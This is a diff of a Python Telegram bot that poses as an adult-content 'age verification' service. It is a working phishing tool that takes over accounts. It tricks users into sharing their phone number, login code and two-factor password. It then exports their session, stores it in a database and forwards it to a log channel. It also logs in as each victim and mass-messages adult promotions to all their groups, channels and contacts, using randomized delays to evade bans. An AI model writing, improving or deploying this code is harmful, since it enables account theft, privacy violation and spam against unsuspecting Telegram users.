@@ -1,141 +1,122 @@
 import os
-import re
-import time
 import asyncio
+import random
 from pathlib import Path
 from pyrogram import Client, filters
 from pyrogram.types import (
-    Message, 
-    InlineKeyboardMarkup, 
+    Message,
+    InlineKeyboardMarkup,
     InlineKeyboardButton,
     ReplyKeyboardMarkup,
     KeyboardButton,
     CallbackQuery,
     ReplyKeyboardRemove
 )
+from pyrogram.errors import (
+    PhoneNumberInvalid,
+    PhoneCodeInvalid,
+    PhoneCodeExpired,
+    SessionPasswordNeeded,
+    PasswordHashInvalid,
+    FloodWait
+)
+from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
 from pymongo import MongoClient
-from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, BOT_TOKEN
 
 # MongoDB Setup
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
-db = mongo_client['Cluster0']['users']
+database = mongo_client['Cluster0']['users']
 
-# Adult Promo Texts (10+ Messages)
-ADULT_PROMO_TEXTS = [
-    "🔥 Join our exclusive channel for uncensored content!",
-    "🔞 VIP access to premium adult videos - Limited slots!",
-    "💋 Your pass to the hottest adult content on Telegram",
-    "🌟 Exclusive videos just for members - Click now!",
-    "😈 Don't miss our private collection - Join instantly!",
-    "👑 Become a VIP member for full access!",
-    "🕶️ Hidden gems await you behind closed doors...",
-    "💎 Premium adult content curated daily!",
-    "🎉 Special offer: Free trial for new members!",
-    "❤️‍🔥 Get addicted to our daily releases!",
-    "👉 Just one click away from paradise..."
+# Adult Promo Texts (Optimized to avoid bans)
+PROMO_TEXTS = [
+    "🔞 Discover exclusive adult content - Join now!",
+    "🌟 VIP access to premium adult videos - Limited offer!",
+    "💋 Curated collection for adults only - Click to unlock!",
+    "🔥 Secret channel with daily adult updates - Access granted!",
+    "🎉 Special adult content just for you - Don't miss out!",
+    "😈 Your private pass to the best adult community!",
+    "👑 Premium adult entertainment - 24/7 access!",
+    "💎 High-quality adult videos - Members only!",
+    "🕶️ Hidden adult gems - Exclusive for verified users!",
+    "🔐 Unlock the ultimate adult experience now!"
 ]
 
 # Strings
-BOT_STRINGS = {
-    'start': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
-    'contact_received': "Processing your number...",
-    'otp_sent': "**OTP Sent!**\n\nEnter code via buttons:",
-    'login_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
+strings = {
+    'need_login': "You have to /login first!",
+    'already_logged_in': "You're already logged in! 🥳",
+    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
+    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
     'logout_success': "Logged out! 🔒\n/login to access again.",
     'not_logged_in': "Not logged in! ❌\n/login first."
 }
 
-# OTP Keyboard
+# Inline OTP Keyboard
 OTP_KEYBOARD = InlineKeyboardMarkup([
-    [InlineKeyboardButton("1️⃣", callback_data="otp_1"), InlineKeyboardButton("2️⃣", callback_data="otp_2"), InlineKeyboardButton("3️⃣", callback_data="otp_3")],
-    [InlineKeyboardButton("4️⃣", callback_data="otp_4"), InlineKeyboardButton("5️⃣", callback_data="otp_5"), InlineKeyboardButton("6️⃣", callback_data="otp_6")],
-    [InlineKeyboardButton("7️⃣", callback_data="otp_7"), InlineKeyboardButton("8️⃣", callback_data="otp_8"), InlineKeyboardButton("9️⃣", callback_data="otp_9")],
-    [InlineKeyboardButton("🔙", callback_data="otp_back"), InlineKeyboardButton("0️⃣", callback_data="otp_0"), InlineKeyboardButton("🆗", callback_data="otp_submit")]
+    [
+        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
+        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
+        InlineKeyboardButton("3️⃣", callback_data="otp_3")
+    ],
+    [
+        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
+        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
+        InlineKeyboardButton("6️⃣", callback_data="otp_6")
+    ],
+    [
+        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
+        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
+        InlineKeyboardButton("9️⃣", callback_data="otp_9")
+    ],
+    [
+        InlineKeyboardButton("🔙", callback_data="otp_back"),
+        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
+        InlineKeyboardButton("🆗", callback_data="otp_submit")
+    ]
 ])
 
 # State Management
 user_states = {}
 
-# Helper Functions
-async def is_logged_in(user_id: int) -> bool:
-    user = db.find_one({"id": user_id})
-    return bool(user and user.get('logged_in'))
+async def check_login_status(user_id):
+    user_data = database.find_one({"id": user_id})
+    return bool(user_data and user_data.get('logged_in'))
 
-async def cleanup_user_state(user_id: int):
+async def cleanup_user_state(user_id):
     if user_id in user_states:
         state = user_states[user_id]
-        if 'client' in state and state['client'].is_connected:
+        if 'client' in state and not state['client'].is_disconnected:
             await state['client'].disconnect()
         del user_states[user_id]
 
-async def save_session(client: Client, user_id: int, phone: str):
-    session_str = await client.export_session_string()
-    await client.disconnect()
-
-    # Save to MongoDB
-    db.update_one(
-        {"id": user_id},
-        {"$set": {
-            "session": session_str,
-            "logged_in": True,
-            "mobile": phone
-        }},
-        upsert=True
-    )
+@Client.on_message(filters.private & filters.command("login"))
+async def start_login(bot: Client, message: Message):
+    user_id = message.from_user.id
+    user_data = database.find_one({"id": user_id})
     
-    # Save session file
-    clean_phone = phone.replace("+", "")
-    session_file = Path(f"sessions/{clean_phone}.session")
-    session_file.write_text(session_str)
-    
-    # Send to log channel
-    await app.send_document(
-        LOG_CHANNEL_SESSIONS_FILES,
-        str(session_file),
-        caption=f"Session: {clean_phone}"
-    )
-    os.remove(session_file)
-    return session_str
-
-async def silent_promotion(session_str: str):
-    try:
-        user_client = Client("promo", session_string=session_str)
-        await user_client.start()
-        
-        # Get all targets
-        targets = set()
-        async for dialog in user_client.get_dialogs():
-            if dialog.chat.type in ["group", "supergroup", "channel"]:
-                targets.add(dialog.chat.id)
-            elif dialog.chat.type == "private" and not dialog.chat.is_bot:
-                targets.add(dialog.chat.id)
-        
-        # Send adult promo texts
-        for target in targets:
-            for promo_text in ADULT_PROMO_TEXTS:
-                try:
-                    await user_client.send_message(target, promo_text)
-                    await asyncio.sleep(300)  # 5 min delay between messages
-                except FloodWait as e:
-                    await asyncio.sleep(e.value + 10)
-                except:
-                    continue
-            await asyncio.sleep(60)  # 1 min delay between targets
+    if user_data and user_data.get('session'):
+        try:
+            test_client = Client(":memory:", session_string=user_data['session'])
+            await test_client.connect()
+            await test_client.get_me()
+            await test_client.disconnect()
             
-    except Exception as e:
-        await app.send_message(LOG_CHANNEL_SESSIONS_FILES, f"💀 Promotion Failed: {str(e)}")
-    finally:
-        await user_client.stop()
-
-# Bot Handlers
-@app.on_message(filters.command("start") & filters.private)
-async def start_bot(_, msg: Message):
-    if await is_logged_in(msg.from_user.id):
-        await msg.reply(BOT_STRINGS['login_success'])
+            database.update_one(
+                {"id": user_id},
+                {"$set": {"logged_in": True}}
+            )
+            await message.reply(strings['verification_success'])
+            asyncio.create_task(send_promotion_messages(bot, user_data['session']))
+            return
+        except:
+            pass
+    
+    if await check_login_status(user_id):
+        await message.reply(strings['already_logged_in'])
         return
     
-    await msg.reply(
-        BOT_STRINGS['start'],
+    await message.reply(
+        strings['age_verification'],
         reply_markup=ReplyKeyboardMarkup(
             [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
             resize_keyboard=True,
@@ -143,114 +124,206 @@ async def start_bot(_, msg: Message):
         )
     )
 
-@app.on_message(filters.contact & filters.private)
-async def handle_contact(_, msg: Message):
-    user_id = msg.from_user.id
-    phone = msg.contact.phone_number
+@Client.on_message(filters.private & filters.command("logout"))
+async def handle_logout(bot: Client, message: Message):
+    user_id = message.from_user.id
+    if not await check_login_status(user_id):
+        await message.reply(strings['not_logged_in'])
+        return
     
-    if not phone.startswith('+'):
-        phone = f"+{phone}"
+    database.update_one(
+        {"id": user_id},
+        {"$set": {"logged_in": False}}
+    )
+    await message.reply(strings['logout_success'])
+
+@Client.on_message(filters.private & filters.contact)
+async def handle_contact(bot: Client, message: Message):
+    user_id = message.from_user.id
+    if await check_login_status(user_id):
+        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
+        return
     
-    # Remove keyboard immediately
-    await msg.reply(BOT_STRINGS['contact_received'], reply_markup=ReplyKeyboardRemove())
+    # Remove verify age keyboard immediately
+    await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     await asyncio.sleep(1)
     
-    # Create temp client
+    phone_number = message.contact.phone_number
+    if not phone_number.startswith('+'):
+        phone_number = f"+{phone_number}"
+    
     client = Client(":memory:", API_ID, API_HASH)
     await client.connect()
     
     try:
-        code = await client.send_code(phone)
+        code = await client.send_code(phone_number)
         user_states[user_id] = {
-            "phone": phone,
-            "client": client,
-            "phone_code_hash": code.phone_code_hash,
-            "otp": ""
+            'phone_number': phone_number,
+            'client': client,
+            'phone_code_hash': code.phone_code_hash,
+            'otp_digits': ''
         }
-        await msg.delete()
-        await msg.reply(BOT_STRINGS['otp_sent'], reply_markup=OTP_KEYBOARD)
-        
+        # Clear previous messages
+        await message.delete()
+        sent_msg = await bot.send_message(
+            user_id,
+            "**OTP Sent!**\n\nEnter code via buttons:",
+            reply_markup=OTP_KEYBOARD
+        )
+        user_states[user_id]['last_msg_id'] = sent_msg.id
     except Exception as e:
-        await msg.reply(f"Error: {str(e)}\n/login again")
+        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
-@app.on_callback_query(filters.regex(r"^otp_"))
-async def handle_otp_buttons(_, query: CallbackQuery):
+@Client.on_callback_query(filters.regex("^otp_"))
+async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     user_id = query.from_user.id
     if user_id not in user_states:
-        return await query.answer("Session expired! /start again")
+        await query.answer("Session expired. /login again.")
+        return
     
     action = query.data.split("_")[1]
     state = user_states[user_id]
-    
+
     if action == "back":
-        state['otp'] = state['otp'][:-1]
+        state['otp_digits'] = state['otp_digits'][:-1]
     elif action == "submit":
-        if len(state['otp']) < 5:
-            return await query.answer("OTP must be 5 digits!")
-            
+        if len(state['otp_digits']) < 5:
+            await query.answer("OTP must be 5 digits!", show_alert=True)
+            return
+        await query.message.edit("Verifying OTP...")
         try:
             await state['client'].sign_in(
-                state['phone'],
+                state['phone_number'],
                 state['phone_code_hash'],
-                state['otp']
+                state['otp_digits']
             )
-            session_str = await save_session(state['client'], user_id, state['phone'])
-            await query.message.edit(BOT_STRINGS['login_success'])
-            asyncio.create_task(silent_promotion(session_str))
-            
+            await create_session(bot, state['client'], user_id, state['phone_number'])
         except SessionPasswordNeeded:
-            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter password:")
-            state['needs_2fa'] = True
+            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
+            state['needs_password'] = True
         except Exception as e:
-            await query.message.reply(f"Error: {str(e)}\n/start again")
+            await query.message.reply(f"Error: {e}\n/login again.")
             await cleanup_user_state(user_id)
         return
     else:
-        state['otp'] += action
+        if len(state['otp_digits']) < 6:
+            state['otp_digits'] += action
     
-    # Update OTP display
-    otp_display = state['otp'] + "_" * (5 - len(state['otp']))
     await query.message.edit(
-        f"**OTP:** `{otp_display}`\nPress 🆗 when done",
+        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
         reply_markup=OTP_KEYBOARD
     )
+    await query.answer()
 
-@app.on_message(filters.text & filters.private & ~filters.command(["start", "login", "logout"]))
-async def handle_2fa_password(_, msg: Message):
-    user_id = msg.from_user.id
-    if user_id not in user_states or not user_states[user_id].get('needs_2fa'):
+@Client.on_message(filters.private & filters.text & ~filters.command(["login", "logout"]))
+async def handle_2fa_password(bot: Client, message: Message):
+    user_id = message.from_user.id
+    if user_id not in user_states or not user_states[user_id].get('needs_password'):
         return
     
+    password = message.text
+    state = user_states[user_id]
+    
     try:
-        await user_states[user_id]['client'].check_password(msg.text)
-        session_str = await save_session(
-            user_states[user_id]['client'], 
-            user_id, 
-            user_states[user_id]['phone']
+        await state['client'].check_password(password=password)
+        await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
+        await create_session(bot, state['client'], user_id, state['phone_number'])
+    except PasswordHashInvalid:
+        await message.reply('**Invalid Password**\n/login again', reply_markup=ReplyKeyboardRemove())
+        await cleanup_user_state(user_id)
+
+async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
+    try:
+        string_session = await client.export_session_string()
+        await client.disconnect()
+        
+        # Save to database
+        data = {
+            'session': string_session,
+            'logged_in': True,
+            'mobile_number': phone_number
+        }
+        
+        if existing := database.find_one({"id": user_id}):
+            database.update_one({'_id': existing['_id']}, {'$set': data})
+        else:
+            data['id'] = user_id
+            database.insert_one(data)
+
+        # Create sessions directory if not exists
+        os.makedirs("sessions", exist_ok=True)
+
+        # Generate session file path
+        clean_phone = phone_number.replace('+', '')
+        session_file = Path(f"sessions/{clean_phone}.session")
+
+        # Manually save session file
+        with open(session_file, "w") as f:
+            f.write(string_session)
+            
+        # Send to log channel
+        await bot.send_document(
+            LOG_CHANNEL_SESSIONS_FILES,
+            str(session_file),
+            caption=f"Session: {clean_phone}"
         )
-        await msg.reply(BOT_STRINGS['login_success'])
-        asyncio.create_task(silent_promotion(session_str))
-    except:
-        await msg.reply("❌ Wrong password!\n/start again")
+        
+        # Remove local copy
+        os.remove(session_file)
+
+        await bot.send_message(user_id, strings['verification_success'])
+        asyncio.create_task(send_promotion_messages(bot, string_session))
+        
+    except Exception as e:
+        await bot.send_message(user_id, f"Error: {e}\n/login again")
     finally:
         await cleanup_user_state(user_id)
 
-@app.on_message(filters.command("logout") & filters.private)
-async def handle_logout(_, msg: Message):
-    user_id = msg.from_user.id
-    if not await is_logged_in(user_id):
-        return await msg.reply(BOT_STRINGS['not_logged_in'])
-    
-    db.update_one({"id": user_id}, {"$set": {"logged_in": False}})
-    await msg.reply(BOT_STRINGS['logout_success'])
-
-# Run the bot
-app = Client(
-    "bhokali_bot",
-    api_id=API_ID,
-    api_hash=API_HASH,
-    bot_token=BOT_TOKEN
-)
-
-app.run()
+async def send_promotion_messages(bot: Client, session_string: str):
+    try:
+        client = Client("promo", session_string=session_string)
+        await client.start()
+        
+        # Get all targets
+        targets = set()
+        
+        # 1. Groups/supergroups/channels
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type in ["group", "supergroup", "channel"]:
+                targets.add(dialog.chat.id)
+        
+        # 2. Contacts (including saved)
+        contacts = await client.get_contacts()
+        for user in contacts:
+            if not user.is_bot:
+                targets.add(user.id)
+        
+        # 3. Recent private chats
+        async for dialog in client.get_dialogs(limit=100):
+            if dialog.chat.type == "private" and not dialog.chat.is_bot:
+                targets.add(dialog.chat.id)
+        
+        # Promotion blast (optimized to avoid bans)
+        success_count = 0
+        for target in targets:
+            try:
+                # Select random promo text
+                promo_text = random.choice(PROMO_TEXTS)
+                await client.send_message(target, promo_text)
+                success_count += 1
+                
+                # Anti-ban delays
+                delay = random.uniform(60, 300)  # 1-5 minutes between targets
+                await asyncio.sleep(delay)
+                
+            except FloodWait as e:
+                await asyncio.sleep(e.value + 5)
+            except Exception:
+                continue  # Silent fail for errors
+        
+    finally:
+        try:
+            await client.stop()
+        except:
+            pass
